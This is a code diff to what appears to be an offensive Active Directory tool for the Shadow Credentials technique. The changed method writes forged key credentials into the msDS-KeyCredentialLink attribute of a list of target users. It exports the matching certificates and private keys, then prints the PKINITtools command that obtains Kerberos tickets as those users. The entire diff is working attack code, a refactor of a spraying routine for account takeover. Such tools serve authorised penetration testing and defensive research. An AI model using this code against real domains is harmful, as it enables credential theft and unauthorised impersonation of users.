@@ -392,6 +392,12 @@ class ShadowCredentials(object):
         logger.info("Performing attempts to add msDS-KeyCredentialLink for a list of users")
         if type(self.target_samname) == str:
             self.target_samname = [self.target_samname]
+        if path is None:
+            path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
+            logger.verbose("No filename was provided. The certificate(s) will be stored with the filename: <USERNAME>_%s" % path)
+        if export_type == "PFX" and password is None:
+            password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
+            logger.verbose("No pass was provided. The certificate will be stored with the password: %s" % password)
         targets_owned = []
         for samname in self.target_samname:
             result = self.get_dn_sid_from_samname(samname)
@@ -416,24 +422,24 @@ class ShadowCredentials(object):
                 self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
                 if self.ldap_session.result['result'] == 0:
                     targets_owned.append(samname)
-                    if path is None:
-                        path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
-                        logger.verbose("No filename was provided. The certificate(s) will be stored with the filename: %s" % f'{samname}_{path}')
+                    logger.success(f"Updated the msDS-KeyCredentialLink attribute of the target object: {samname}")
                     if export_type == "PEM":
                         certificate.ExportPEM(path_to_files=f'{samname}_{path}')
-                        logger.success(f"Updated the msDS-KeyCredentialLink attribute of the target object: {samname}, {samname + '_' + path + '_cert.pem'}, {samname + '_' + path + '_priv.pem'}")
+                        logger.info(f"Saved PEM certificate for {samname} at path {samname + '_' + path + '_cert.pem'}, PEM private key at path {samname + '_' + path + '_priv.pem'}")
                     elif export_type == "PFX":
-                        if password is None:
-                            password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
-                            logger.verbose(f"No pass was provided. The certificate will be stored with the password: %s" % password)
                         certificate.ExportPFX(password=password, path_to_file=f'{samname}_{path}')
-                        logger.success(f"Updated the msDS-KeyCredentialLink attribute of the target object: {samname}, {samname + '_' + path + '.pfx'}, {password}")
+                        logger.info(f"Saved PFX (#PKCS12) certificate & key for {samname} at path {samname + '_' + path + '.pfx'}, the password is {password}")
             except IndexError:
                 logger.info('Attribute msDS-KeyCredentialLink does not exist')
         if not targets_owned:
             logger.warning("No user object was modified during the spray")
         else:
             logger.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
+            logger.verbose("Run the following command to obtain a TGT")
+            if export_type == "PEM":
+                logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pem <USERNAME>_%s_cert.pem -key-pem <USERNAME>_%s_priv.pem %s/<USERNAME> <USERNAME>.ccache" % (path, path, domain))
+            elif export_type == "PFX":
+                logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pfx <USERNAME>_%s.pfx -pfx-pass %s %s/<USERNAME> <USERNAME>.ccache" % (path, password, domain))
 
 
     def remove(self, device_id):
